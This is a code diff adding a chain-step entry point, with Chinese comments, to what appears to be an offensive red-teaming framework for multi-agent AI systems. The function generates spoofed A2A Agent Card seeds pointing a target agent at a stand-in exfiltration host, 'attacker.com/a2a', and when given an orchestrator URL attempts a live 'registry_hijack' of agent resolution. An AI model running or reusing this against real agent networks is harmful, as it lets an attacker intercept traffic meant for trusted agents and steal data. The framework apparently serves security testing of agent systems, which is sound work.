@@ -431,3 +431,48 @@ def create_agent_card_spoofer(
         timeout=timeout,
         stealth_mode=stealth_mode,
     )
+
+
+async def run_card_spoofer(ctx: Any) -> dict[str, Any]:
+    """攻击链入口（ChainExecutor 发现名：`run_<action>` = `run_card_spoofer`）。
+
+    作为 `config/components/a2a.yaml` 声明于 `strike_modules` 的链步骤入口，被
+    `strike/common/chain_executor.py` 通过 `run_<action>` 匹配并调用。
+
+    默认仅生成可投递的 Agent Card 欺骗种子；若 `ctx.args` 同时提供
+    `a2a_orchestrator_url` 与 `a2a_target_agent`，则尝试实际发起 registry/agent-card
+    劫持（失败不影响种子产出，向下游如实记录）。
+
+    Args:
+        ctx: PipelineContext（可选读取 args.a2a_target_agent / exfil_url /
+            a2a_orchestrator_url）
+
+    Returns:
+        {"seeds": [seed-format dict, ...], "spoof_result": dict | None, "count": int}
+    """
+    args = getattr(ctx, "args", None)
+    target_agent = getattr(args, "a2a_target_agent", "sales-agent.internal")
+    attacker_url = getattr(args, "exfil_url", "https://attacker.com/a2a")
+
+    spoofer = AgentCardSpoofer()
+    seeds = spoofer.generate_spoof_seeds(target_agent=target_agent, attacker_url=attacker_url)
+
+    produced: dict[str, Any] = {"seeds": seeds, "spoof_result": None, "count": len(seeds)}
+
+    orchestrator_url = getattr(args, "a2a_orchestrator_url", "")
+    if orchestrator_url:
+        try:
+            result = await spoofer.spoof_agent_resolution(
+                target_agent=target_agent,
+                spoof_url=attacker_url,
+                method="registry_hijack",
+                orchestrator_url=orchestrator_url,
+            )
+            produced["spoof_result"] = result.to_dict()
+            produced["count"] += 1
+            logger.info("[Chain] card_spoofer 实际劫持 %s: success=%s", target_agent, result.success)
+        except Exception as e:  # 实际劫持失败不阻断种子产出（C9 诚实记录）
+            logger.warning("[Chain] card_spoofer 实际劫持失败（不影响种子产出）: %s", e)
+
+    logger.info("[Chain] card_spoofer 生成 %d 条欺骗种子", len(seeds))
+    return produced
